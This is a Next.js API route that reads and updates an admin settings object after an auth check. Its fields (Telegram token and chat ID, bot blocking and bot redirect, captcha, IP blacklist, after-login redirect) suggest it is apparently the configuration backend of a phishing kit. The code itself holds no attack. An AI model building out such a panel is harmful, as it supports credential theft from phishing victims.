import type { NextApiRequest, NextApiResponse } from "next";
import { dbService } from "@/services/database";
import { verifyAuth } from "@/services/auth";

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const user = await verifyAuth(req);
  if (!user) {
    return res.status(401).json({ message: "Unauthorized" });
  }

  if (req.method === "GET") {
    try {
      const settings = await dbService.getSettings();
      if (!settings) {
        // Return default settings if none exist
        return res.status(200).json({
          telegramToken: "",
          telegramChatId: "",
          blockBots: true,
          redirectLink: "",
          useCaptcha: true,
          linkPath: "",
          blacklistedIPs: [],
          botRedirectLink: "",
          afterLoginRedirect: "",
          expiryDays: 5,
        });
      }
      return res.status(200).json(settings);
    } catch (error) {
      console.error("Settings error:", error);
      return res.status(500).json({ message: "Error fetching settings" });
    }
  } else if (req.method === "POST") {
    try {
      const settings = req.body;
      await dbService.updateSettings(settings);
      return res.status(200).json({ message: "Settings updated successfully" });
    } catch (error) {
      console.error("Update error:", error);
      return res.status(500).json({ message: "Error updating settings" });
    }
  }
  return res.status(405).json({ message: "Method not allowed" });
}
